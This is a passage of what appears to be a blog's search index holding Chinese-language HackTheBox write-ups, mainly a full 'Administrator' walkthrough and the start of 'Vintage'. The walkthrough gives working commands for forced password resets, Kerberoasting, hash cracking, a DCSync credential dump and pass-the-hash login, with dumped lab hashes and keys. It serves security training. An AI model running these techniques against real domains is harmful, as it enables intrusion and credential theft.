æˆ–å…¶ä»–é«˜çº§æƒé™ï¼Œå®ƒå°±å¯ä»¥å®ç°ç±»ä¼¼äºç®¡ç†å‘˜çš„æ§åˆ¶ï¼Œç‰¹åˆ«æ˜¯åœ¨è¯ä¹¦ç®¡ç†å’Œå±æ€§æ›´æ”¹æ–¹é¢)ã€‚è¯·æ±‚caè·å–åˆ°ä»£è¡¨administratorçš„è¯ä¹¦ï¼Œæœ€åé€šè¿‡è¿™ä¸ªä¼ªè¯ä¹¦è·å–åˆ°administratorçš„NThashã€‚\n","date":"2024-12-08","externalUrl":null,"permalink":"/posts/2024/12/htb-certified/","section":"Posts","summary":"","title":"HTB-Certified","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich\nNmap #\râ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# nmap -sSCV -Pn administrator.htb\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 15:51 CST\rNmap scan report for administrator.htb (10.10.11.42)\rHost is up (0.072s latency).\rNot shown: 988 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r21/tcp open ftp Microsoft ftpd\r| ftp-syst: |_ SYST: Windows_NT\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-05 14:37:40Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_clock-skew: 6h46m00s\r| smb2-time: | date: 2024-12-05T14:37:51\r|_ start_date: N/A Crackmapexec #\ré€šè¿‡SMBæœåŠ¡ï¼Œè·å–åˆ°äº†å½“å‰å­˜åœ¨çš„ç”¨æˆ·ä¿¡æ¯\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# crackmapexec smb administrator.htb -u \u0026#34;Olivia\u0026#34; -p \u0026#34;ichliebedich\u0026#34; --rid-brute | grep SidTypeUser\rSMB administrator.htb 445 DC 500: ADMINISTRATOR\\Administrator (SidTypeUser)\rSMB administrator.htb 445 DC 501: ADMINISTRATOR\\Guest (SidTypeUser)\rSMB administrator.htb 445 DC 502: ADMINISTRATOR\\krbtgt (SidTypeUser)\rSMB administrator.htb 445 DC 1000: ADMINISTRATOR\\DC$ (SidTypeUser)\rSMB administrator.htb 445 DC 1108: ADMINISTRATOR\\olivia (SidTypeUser)\rSMB administrator.htb 445 DC 1109: ADMINISTRATOR\\michael (SidTypeUser)\rSMB administrator.htb 445 DC 1110: ADMINISTRATOR\\benjamin (SidTypeUser)\rSMB administrator.htb 445 DC 1112: ADMINISTRATOR\\emily (SidTypeUser)\rSMB administrator.htb 445 DC 1113: ADMINISTRATOR\\ethan (SidTypeUser)\rSMB administrator.htb 445 DC 3601: ADMINISTRATOR\\alexander (SidTypeUser)\rSMB administrator.htb 445 DC 3602: ADMINISTRATOR\\emma (SidTypeUser) Bloodhound #\râ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# bloodhound-python -u Olivia -p \u0026#39;ichliebedich\u0026#39; -c All -d administrator.htb -ns 10.10.11.42\rINFO: Found AD domain: administrator.htb\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known\rINFO: Connecting to LDAP server: dc.administrator.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc.administrator.htb\rINFO: Found 11 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: dc.administrator.htb\rINFO: Done in 00M 14S æ·»åŠ dc.administrator.htbåˆ°/etc/hosts\nç»è¿‡åˆ†æOliviaæ˜¯å¯ä»¥æ§åˆ¶michaelçš„\nMichaelå¯ä»¥å¼ºåˆ¶ä¿®æ”¹Benjaminçš„å¯†ç \nUser #\ré¦–å…ˆå…ˆä¿®æ”¹Michaelçš„å¯†ç \nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# bloodyAD -u \u0026#34;olivia\u0026#34; -p \u0026#34;ichliebedich\u0026#34; -d \u0026#34;Administrator.htb\u0026#34; --host \u0026#34;10.10.11.42\u0026#34; set password \u0026#34;Michael\u0026#34; \u0026#34;12345678\u0026#34;\r[+] Password changed successfully! ç„¶åç”¨Michaelçš„è´¦æˆ·å»ä¿®æ”¹Benjaminçš„å¯†ç \nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# bloodyAD -u \u0026#34;Michael\u0026#34; -p \u0026#34;12345678\u0026#34; -d \u0026#34;Administrator.htb\u0026#34; --host \u0026#34;10.10.11.42\u0026#34; set password \u0026#34;Benjamin\u0026#34; \u0026#34;12345678\u0026#34;\r[+] Password changed successfully! ä½¿ç”¨FTPç™»å½•ï¼Œå‘ç°å­˜åœ¨å¤‡ä»½æ–‡ä»¶\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# ftp administrator.htb Connected to administrator.htb.\r220 Microsoft FTP Service\rName (administrator.htb:kali): Benjamin\r331 Password required\rPassword: 230 User logged in.\rRemote system type is Windows_NT.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||62217|)\r125 Data connection already open; Transfer starting.\r10-05-24 08:13AM 952 Backup.psafe3\r226 Transfer complete.\rftp\u0026gt; get Backup.psafe3\rlocal: Backup.psafe3 remote: Backup.psafe3\r229 Entering Extended Passive Mode (|||62224|)\r125 Data connection already open; Transfer starting.\r100% |*******************************************************************| 952 7.19 KiB/s 00:00 ETA\r226 Transfer complete.\rWARNING! 3 bare linefeeds received in ASCII mode.\rFile may not have transferred correctly.\r952 bytes received in 00:00 (4.76 KiB/s)\rftp\u0026gt; exit\r221 Goodbye psafe3æ–‡ä»¶æ˜¯åŠ å¯†çš„å¯†ç å®‰å…¨æ–‡ä»¶\næ— æ³•ç›´æ¥è¯»å–ï¼Œéœ€è¦ä½¿ç”¨pwsafe2johnå·¥å…·è¿›è¡Œè·å–hashï¼Œå¡kaliè‡ªå¸¦æœ‰\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# pwsafe2john Backup.psafe3 Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050 æ‹¿åˆ°hashï¼Œå°è¯•è¿›è¡Œè§£å¯†\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])\rCost 1 (iteration count) is 2048 for all loaded hashes\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rtekieromucho (Backu) 1g 0:00:00:00 DONE (2024-12-05 23:24) 4.761g/s 29257p/s 29257c/s 29257C/s newzealand..iheartyou\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. å¾—åˆ°å¯†ç æ˜¯tekieromucho\nå®‰è£…Passwordsafeåˆ°kaliä¸­ï¼Œç„¶åç”¨å¯†ç æ‰“å¼€è¿™ä¸ªæ–‡ä»¶\nå°†ä¸‰ä¸ªç”¨æˆ·çš„PASSWORDå¤åˆ¶ä¸‹æ¥\nalexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw\remily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb\remma:WwANQWnmJnGV07WQN8bMS7FMAbjNur ç”±äºç›®æ ‡æœºå™¨ä¸Šçš„5985ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œå¯ä»¥ä½¿ç”¨evil-winrmè¿œç¨‹ç™»å½•\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# evil-winrm -i administrator.htb -u emily -p \u0026#34;UXLCI5iETUsIBoFVTj8yQFKoHjXmb\u0026#34; Privilege Escalation #\rEmliyå¯¹Ethanå¯ä»¥æƒé™å†™å…¥\nOwn Ethan #\rå› ä¸ºEmliyå¯¹Ethançš„æƒé™ï¼Œå¯ä»¥ä½¿ç”¨Targeted Kerberoastingæ”»å‡»\ntargetedKerberoast æ˜¯ä¸€ä¸ª Python è„šæœ¬ï¼Œä¸è®¸å¤šå…¶ä»–è„šæœ¬ï¼ˆä¾‹å¦‚Â GetUserSPNs.pyï¼‰ä¸€æ ·ï¼Œå®ƒå¯ä»¥ä¸ºè®¾ç½®äº† SPN çš„ç”¨æˆ·å¸æˆ·æ‰“å° â€œkerberoastâ€ å“ˆå¸Œå€¼ã€‚ è¯¥å·¥å…·å¸¦æ¥äº†ä»¥ä¸‹é™„åŠ åŠŸèƒ½ï¼šå¯¹äºæ¯ä¸ªæ²¡æœ‰ SPN çš„ç”¨æˆ·ï¼Œå®ƒä¼šå°è¯•è®¾ç½®ä¸€ä¸ªï¼ˆæ»¥ç”¨å¯¹å±æ€§çš„å†™å…¥æƒé™ï¼‰ï¼Œæ‰“å° â€œkerberoastâ€ å“ˆå¸Œï¼Œå¹¶åˆ é™¤ä¸ºè¯¥æ“ä½œè®¾ç½®çš„ä¸´æ—¶ SPNã€‚\n[github author=\u0026ldquo;ShutdownRepo\u0026rdquo; project=\u0026ldquo;targetedKerberoast\u0026rdquo;][/github]\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator/targetedKerberoast]\râ””â”€# python targetedKerberoast.py -u \u0026#34;emily\u0026#34; -p \u0026#34;UXLCI5iETUsIBoFVTj8yQFKoHjXmb\u0026#34; -d \u0026#34;Administrator.htb\u0026#34; --dc-ip 10.10.11.42\r[*] Starting kerberoast attacks\r[*] Fetching usernames from Active Directory with LDAP\r[+] Printing hash for (ethan)\r$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$15ec7606ffa3297b86b280475f514f9c$2e4d87fb991fa421183d34d1f57dc6eff6cf90d47f165e99e8caa4042a91278d9ae1897d9b5bd1c4938ae952b02b253b63207405bb7f66b8509c614b4e8a0fe9bff6e4ae67a8c6df5ce80d08d1e2f0cc78389f94289f4fe121f402cf1d8a411db8e49116ae92534989d03f740899d01f2f264273ad4da38a5537fde4c4d629961839c4a7916a3f246240ce1e50602d648a17d05384131d1729c9debfe576e9a37bf347899896e9df8bec3b2ac16110da971e0142ef5435bb73ee2fca6baf923ad26540ff42b735d73ff730cdb075026d0646247db541b3c824a2c8fef6c72572d06c64f341778b0456cbf6376f22bc444228cc4fef86c8bb62093c7081daf6ab75c809508c2ca0ab0fe679e1dbbd753441316d58d1245fdcd9e1b8ef58faa2c71ae319296eeda923da7a42677e65a7ab048b694ea8f880bb021740f94eb4f9b1416d37cd75f41c2b9d045370890611857ae2576e117c1ca52de93918d7104e95c95cd130b2d06805d6c99d5c13b61ab0040f02117accc14a8ad06e2f6d66103c07e9e96a6a2a94f4a12e34e9c3f8b46a305e778a17958128465967076c0365d7c87bb6c517d8ab27d1a89f582a72e303bf0ac54c1c7d2fbe80b2500cab320cdbac803fdfa2c8a54e8db9870a5dd73193a85878752373da71d223e8cdd47dcd2ba3c3b353bc5f1af493da902c90b5a26a218aa6875ff9ffa5bc8bc2f1f90d65502819f01f3c8539950c1d905b2bd803145cfd603a6d75a654ce2c83210b59ed9e6c232841a7d6f5e706072e8e9ed38baaf4c04640841726e61a7f484e900ef1515480ba9b337f80c9cc9d0f974aff33b83897d340a925ab084d60914f708eb5cb917c91ecb362b490f2da965fc476956c7f2d9968ed61b10bdacd2c371955253ebbddfbfc97ee2b38badec0413bca0ec1e11aa44429c6d3d9ab73aaa4a1425fbf23123260c42ed28229e3b766ed0c5682eb6b097b315f72b8ce387978525b3800229f5a0980de2b1f947168c6956d06c8ad9178aefd34addba5e3c9f719619aa29301579cd426415ae8c9d832a93ce3beccf70b58340e949b12e9e6d9d7ef80a3b5852f0e372ba786237cb3f6b2a2738a3b70fd070f5ecd59e5cab52cb145113fc0f4832ba7adc297d6a01167773f9a9a3a5302a0c6a672b1437372d349752350778db5dcdb5f986a7b3110d2584d12a21d32960c061d0f5a60f182257b8954fcd13936b14ef1c6cd5396b2d3549971d83ef116fe4e65916c73f7d231e1c7c99bd82854b152c016f663ecc4c962a30dce3569f088398f8d230996901bfa72f3427ede4d73d1f7b8828fe098c958867c3bd9017002c3e74fbe73650d05228039b57c916ae017e89859afb79c9fb951c815476495819840ae9468fdb66d6ee687de54fed4724c77eee4bd4f9b4995005f644e2b1a58f87deb91088ec9e318fe9d1f6b34a33f6e2e001c2a0e3c0d7f463376a5e3827fadf2a88d6f79d73188b207e06b3207700a5929dd3b6d7fe47bb71402d1881a49a990f0472d912937b66825 å¦‚æœä¸Šé¢æ— æ³•æ‰§è¡Œï¼Œå¯ä»¥å°è¯•åŒæ­¥æ—¶åŒºï¼Œå› ä¸ºKerberosçš„è®¤è¯å¯¹æ—¶é—´æ ¡å‡†å¾ˆä¸¥æ ¼\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# ntpdate administrator.htb è§£å¯†hash\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rlimpbizkit (?) 1g 0:00:00:00 DONE (2024-12-06 17:35) 100.0g/s 512000p/s 512000c/s 512000C/s newzealand..babygrl\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. å¾—åˆ°Ethançš„å¯†ç ï¼šlimpbizkit\næ£€æŸ¥Ethan\nAblout DCSync #\rFrom here: DCSync(bloodhoundenterprise.io)\næ­¤è¾¹ç¼˜è¡¨ç¤º GetChanges å’Œ GetChangesAll çš„ç»„åˆã€‚è¿™ä¸¤ä¸ªæƒé™çš„ç»„åˆæˆäºˆä¸»ä½“æ‰§è¡Œ DCSync æ”»å‡»çš„èƒ½åŠ›ã€‚\né€šè¿‡è¿™ä¸ªæ¥è·å–Administratorçš„å¯†ç hash\nsecretsdump #\rSecretsdump.py æ˜¯ Impacket æ¡†æ¶ä¸­çš„ä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬ä¹Ÿå¯ä»¥é€šè¿‡ DCSync æŠ€æœ¯å¯¼å‡ºåŸŸæ§åˆ¶å™¨ä¸Šç”¨æˆ·çš„å“ˆå¸Œã€‚è¯¥å·¥å…·çš„åŸç†æ˜¯é¦–å…ˆä½¿ç”¨æä¾›çš„ç”¨æˆ·ç™»å½•å‡­æ®é€šè¿‡ smbexec æˆ–è€… wmiexec è¿œç¨‹è¿æ¥è‡³åŸŸæ§åˆ¶å™¨å¹¶è·å¾—é«˜æƒé™ï¼Œè¿›è€Œä»æ³¨å†Œè¡¨ä¸­å¯¼å‡ºæœ¬åœ°å¸æˆ·çš„å“ˆå¸Œï¼ŒåŒæ—¶é€šè¿‡ Dcsync æˆ–ä» NTDS.dit æ–‡ä»¶ä¸­å¯¼å‡ºæ‰€æœ‰åŸŸç”¨æˆ·çš„å“ˆå¸Œã€‚å…¶æœ€å¤§çš„ä¼˜ç‚¹æ˜¯æ”¯æŒä»åŸŸå¤–çš„è®¡ç®—æœºè¿æ¥è‡³åŸŸæ§åˆ¶å™¨ã€‚\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# impacket-secretsdump \u0026#34;Administrator.htb/ethan:limpbizkit\u0026#34;@\u0026#34;dc.Administrator.htb\u0026#34;\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Using the DRSUAPI method to get NTDS.DIT secrets\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::\radministrator.htb\\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::\radministrator.htb\\michael:1109:aad3b435b51404eeaad3b435b51404ee:d023170ba78a12d11621d96043280763:::\radministrator.htb\\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:d023170ba78a12d11621d96043280763:::\radministrator.htb\\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::\radministrator.htb\\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::\radministrator.htb\\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::\radministrator.htb\\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::\rDC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::\r[*] Kerberos keys grabbed\rAdministrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664\rAdministrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2\rAdministrator:des-cbc-md5:403286f7cdf18385\rkrbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648\rkrbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94\rkrbtgt:des-cbc-md5:2c0bc7d0250dbfc7\radministrator.htb\\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3\radministrator.htb\\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48\radministrator.htb\\olivia:des-cbc-md5:bc2a4a7929c198e9\radministrator.htb\\michael:aes256-cts-hmac-sha1-96:2cfba91e8b2411fe101652e9c51519e40d6c54267d637ee78e7a0d2da917b8cc\radministrator.htb\\michael:aes128-cts-hmac-sha1-96:c5c5efed81e1b0f853fb768e72fa061a\radministrator.htb\\michael:des-cbc-md5:1cb3fd7079a16808\radministrator.htb\\benjamin:aes256-cts-hmac-sha1-96:31e42287be65cb2cfbd6057358db7bc312328b4d9b3956888b13405d891bb4cc\radministrator.htb\\benjamin:aes128-cts-hmac-sha1-96:2771ac747ccbaef1686dc55bd542779c\radministrator.htb\\benjamin:des-cbc-md5:37a4e09ea24ce03e\radministrator.htb\\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4\radministrator.htb\\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218\radministrator.htb\\emily:des-cbc-md5:804343fb6e0dbc51\radministrator.htb\\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f\radministrator.htb\\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f\radministrator.htb\\ethan:des-cbc-md5:58387aef9d6754fb\radministrator.htb\\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6\radministrator.htb\\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade\radministrator.htb\\alexander:des-cbc-md5:49ba9dcb6d07d0bf\radministrator.htb\\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82\radministrator.htb\\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e\radministrator.htb\\emma:des-cbc-md5:3249fba89813ef5d\rDC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb\rDC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d\rDC$:des-cbc-md5:f483547c4325492a\r[*] Cleaning up... ç„¶åä½¿ç”¨evil-winrmçš„hashç™»å½•å°±è¡Œ\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]\râ””â”€# evil-winrm -i administrator.htb -u administrator -H \u0026#34;3dc553ce4b9fd20bd016e098d2d2fd2e\u0026#34; Summary #\rè¿™ä¸ªmachineæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„ã€‚\né€šè¿‡Bloodhoundå¯¹åŸŸå†…ç”¨æˆ·è¿›è¡Œåˆ†æï¼Œå¯ä»¥æ›´å¥½çš„ç¡®å®šæ”»å‡»çš„æ–¹å‘å’Œé¡ºåºã€‚\nå¤šæ‰“æ‰èƒ½å¤šå­¦ï¼Œwindowsæˆ‘åƒå®šä½ äº†ğŸ˜¡ã€‚\n","date":"2024-12-05","externalUrl":null,"permalink":"/posts/2024/12/htb-administrator/","section":"Posts","summary":"","title":"HTB-Administrator","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Hard As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123\nNmap Scan #\râ””â”€# nmap -sC -sV -T4 -Pn vintage.htb -p-\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-04 01:49:22Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r9389/tcp open mc-nmf .NET Message Framing\r49664/tcp open unknown\r49668/tcp open unknown\r49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49681/tcp open unknown\r50907/tcp open unknown\r65103/tcp open unknown\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_clock-skew: -13m55s\r| smb2-time: | date: 2024-12-04T01:49:48\r|_ start_date: N/A å‘ç°åœ¨3269ç«¯å£è¿™ä¸€è¡Œï¼Œå­˜åœ¨ä¸€ä¸ªåä¸ºï¼šDC01 çš„åŸŸæ§ä¸»æœºï¼Œæ·»åŠ åˆ°/etc/hostsä¸­\nå¹¶ä¸”åœ¨3268ä¸­å­˜åœ¨ldapæœåŠ¡å™¨ï¼ŒåŒæ—¶ä¹Ÿå­˜åœ¨KerberosæœåŠ¡ä»¥åŠ5985winrmæœåŠ¡\nldapsearch #\râ””â”€# ldapsearch -x -H ldap://10.10.11.45 -D \u0026#34;P.Rosa@vintage.htb\u0026#34; -w \u0026#34;Rosaisbest123\u0026#34; -b \u0026#34;DC=vintage,DC=htb\u0026#34; \u0026#34;(objectClass=user)\u0026#34; sAMAccountName memberOf å„éƒ¨åˆ†è§£é‡Š\nldapsearch: è¿™æ˜¯ç”¨äºæŸ¥è¯¢ LDAP ç›®å½•çš„å‘½ä»¤è¡Œå·¥å…·ã€‚\n-x: è¡¨ç¤ºä½¿ç”¨ç®€å•èº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯ SASL è®¤è¯ã€‚\n-H ldap://\u0026lt;IP\u0026gt;: æŒ‡å®š LDAP æœåŠ¡å™¨çš„åœ°å€ï¼ˆç”¨å®é™…çš„ IP åœ°å€æ›¿æ¢ \u0026lt;IP\u0026gt;ï¼‰ã€‚\n-D \u0026quot;P.Rosa@vintage.htb\u0026quot;: ç»‘å®š DNï¼ˆDistinguished Nameï¼‰ï¼Œå³ç”¨äºç™»å½• LDAP æœåŠ¡å™¨çš„ç”¨æˆ·å‡­è¯ã€‚\n-w \u0026quot;Rosaisbest123\u0026quot;: æŒ‡å®šç»‘å®šç”¨æˆ·çš„å¯†ç ã€‚\n-b \u0026quot;DC=vintage,DC=htb\u0026quot;: æŒ‡å®šæœç´¢çš„åŸºç¡€ DNï¼ˆBase DNï¼‰ï¼Œå³ä»å“ªä¸ªèŠ‚ç‚¹å¼€å§‹æœç´¢ LDAP ç›®å½•ã€‚\n\u0026quot;(objectClass=user)\u0026quot;: è¿™æ˜¯è¿‡æ»¤å™¨ï¼Œç”¨äºæŒ‡å®šåªæŸ¥è¯¢å¯¹è±¡ç±»ä¸º user çš„æ¡ç›®ã€‚\nsAMAccountName memberOf: æŒ‡å®šè¦è¿”å›çš„å±æ€§ã€‚sAMAccountName æ˜¯ç”¨æˆ·çš„ç™»å½•åï¼ŒmemberOf è¡¨ç¤ºç”¨æˆ·æ‰€å±çš„ç»„ã€‚\nä½¿ç”¨é¢˜ç›®ç»™å‡ºçš„ç”¨æˆ·ä¿¡æ¯è¿›è¡Œldapè¿œç¨‹ç™»é™†ï¼Œå¹¶æšä¸¾åŸŸä¸­çš„ç”¨æˆ·ä»¥åŠæ‰€å±ç»„\n# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;DC=vintage,DC=htb\u0026gt; with scope subtree\r# filter: (objectClass=user)\r# requesting: sAMAccountName memberOf #\r# Administrator, Users, vintage.htb\rdn: CN=Administrator,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: Administrator\r# Guest, Users, vintage.htb\rdn: CN=Guest,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: Guest\r# DC01, Domain Controllers, vintage.htb\rdn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb\rsAMAccountName: DC01$\r# krbtgt, Users, vintage.htb\rdn: CN=krbtgt,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb\rsAMAccountName: krbtgt\r# gMSA01, Managed Service Accounts, vintage.htb\rdn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb\rsAMAccountName: gMSA01$\r# fs01, Computers, vintage.htb\rdn: CN=fs01,CN=Computers,DC=vintage,DC=htb\rmemberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: FS01$\r# M.Rossi, Users, vintage.htb\rdn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb\rsAMAccountName: M.Rossi\r# R.Verdi, Users, vintage.htb\rdn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb\rsAMAccountName: R.Verdi\r# L.Bianchi, Users, vintage.htb\rdn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: L.Bianchi\r# G.Viola, Users, vintage.htb\rdn: CN=G.Viola,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb\rsAMAccountName: G.Viola\r# C.Neri, Users, vintage.htb\rdn: CN=C.Neri,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: C.Neri\r# P.Rosa, Users, vintage.htb\rdn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb\rsAMAccountName: P.Rosa\r# svc_sql, Pre-Migration, vintage.htb\rdn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb\rsAMAccountName: svc_sql\r# svc_ldap, Pre-Migration, vintage.htb\rdn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: 